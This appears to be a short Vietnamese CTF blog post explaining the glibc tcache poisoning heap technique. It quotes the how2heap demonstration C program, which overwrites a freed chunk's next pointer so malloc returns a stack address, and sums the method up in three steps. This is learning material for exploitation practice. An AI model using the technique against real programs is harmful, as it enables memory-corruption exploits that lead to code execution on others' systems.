---
layout : post 
title : Tcache Poision 
---  

Trong bài wu [Nu1CTF warmup](https://hacmao.pw/2019-09-10-Nu1CTF/) có dùng rất nhiều kĩ thuật này. Nhưng mình lúc đó chưa đọc được blog này nên cũng chưa hiểu rõ lắm mà chỉ đoán già đoán non. Ok giờ tổng hợp lại nè  😜😜😜.  

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

int main()
{
	fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc into\n"
	       "returning a pointer to an arbitrary location (in this case, the stack).\n"
	       "The attack is very similar to fastbin corruption attack.\n\n");

	size_t stack_var;
	fprintf(stderr, "The address we want malloc() to return is %p.\n", (char *)&stack_var);

	fprintf(stderr, "Allocating 1 buffer.\n");
	intptr_t *a = malloc(128);
	fprintf(stderr, "malloc(128): %p\n", a);
	fprintf(stderr, "Freeing the buffer...\n");
	free(a);

	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
	a[0] = (intptr_t)&stack_var;

	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);

	intptr_t *b = malloc(128);
	fprintf(stderr, "2nd malloc(128): %p\n", b);
	fprintf(stderr, "We got the control\n");

	return 0;
}
```  
Code chôm từ how2heap nhé :v  
Tức là cách để tận dụng tcache poision tiến hành theo các bước sau :  
```
  1 - Malloc then free chunk A 
  2 - Fix FD of chunk A to our target address  
  3 - Malloc 2 time to dup into target  
```
Khá là giống ```fastbin dupinto stack``` nhưng dễ thực hiện hơn nhiều. 
